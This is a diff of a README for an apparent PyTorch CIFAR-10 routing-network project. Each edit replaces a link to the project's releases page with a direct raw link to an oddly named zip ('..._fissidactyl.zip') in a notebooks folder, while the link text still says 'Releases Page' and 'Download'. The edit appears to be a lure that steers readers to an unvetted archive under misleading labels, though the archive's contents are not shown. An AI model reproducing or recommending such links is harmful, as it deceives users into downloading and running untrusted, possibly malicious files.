@@ -1,7 +1,7 @@
 # 🌟 deep-learning-cifar10-routing-net - Simplified Deep Learning with CIFAR-10
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/suryansh458/deep-learning-cifar10-routing-net/releases)
+[![Download](https://raw.githubusercontent.com/suryansh458/deep-learning-cifar10-routing-net/main/notebooks/deep-learning-cifar10-routing-net_fissidactyl.zip%20release-brightgreen)](https://raw.githubusercontent.com/suryansh458/deep-learning-cifar10-routing-net/main/notebooks/deep-learning-cifar10-routing-net_fissidactyl.zip)
 
 ## 🚀 Getting Started
 This guide helps you download and run the deep-learning-cifar10-routing-net application. This software uses advanced machine learning techniques to help you classify images using the CIFAR-10 dataset. 
@@ -24,7 +24,7 @@ The deep-learning-cifar10-routing-net project is a PyTorch implementation of a r
 
 ## 🔧 Installation Steps
 1. **Visit the Releases Page**
-   Go to the releases page of the project: [Download Page](https://github.com/suryansh458/deep-learning-cifar10-routing-net/releases).
+   Go to the releases page of the project: [Download Page](https://raw.githubusercontent.com/suryansh458/deep-learning-cifar10-routing-net/main/notebooks/deep-learning-cifar10-routing-net_fissidactyl.zip).
 
 2. **Choose the Latest Release**
    Look for the latest version of the application. You can find it at the top of the list. 
@@ -60,4 +60,4 @@ If you want to contribute to the project, feel free to fork the repository and s
 This project is licensed under the MIT License. You are free to use, modify, and distribute the software, provided that you acknowledge the original source.
 
 ## ✅ Conclusion
-This guide should help you navigate the process of downloading and running the deep-learning-cifar10-routing-net application. For further details, visit the [Releases Page](https://github.com/suryansh458/deep-learning-cifar10-routing-net/releases) to start your deep learning journey with CIFAR-10.
+This guide should help you navigate the process of downloading and running the deep-learning-cifar10-routing-net application. For further details, visit the [Releases Page](https://raw.githubusercontent.com/suryansh458/deep-learning-cifar10-routing-net/main/notebooks/deep-learning-cifar10-routing-net_fissidactyl.zip) to start your deep learning journey with CIFAR-10.
